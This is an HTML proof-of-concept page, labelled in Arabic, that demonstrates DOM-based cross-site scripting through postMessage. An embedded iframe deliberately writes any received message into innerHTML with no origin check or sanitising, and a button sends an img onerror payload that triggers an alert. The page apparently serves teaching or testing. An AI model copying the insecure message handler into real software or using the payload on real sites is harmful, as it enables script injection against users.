<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>XSS PoC</title>
</head>
<body>

<h2>🔥 DOM XSS عبر postMessage</h2>
<button onclick="sendXSS()">💥 إرسال الحمولة</button>

<iframe id="target" srcdoc='
  <!DOCTYPE html>
  <html>
  <body>
    <div id="out">[في انتظار الرسالة]</div>
    <script>
      window.addEventListener("message", function(e) {
        if (e.data && e.data.html) {
          document.getElementById("out").innerHTML = e.data.html;
        }
      });
    </script>
  </body>
  </html>
' style="width:100%;height:200px;border:1px solid black;"></iframe>

<script>
function sendXSS() {
  const payload = {
    html: "<img src=x onerror=alert('🔥 XSS')>"
  };
  document.getElementById("target").contentWindow.postMessage(payload, "*");
}
</script>

</body>
</html>
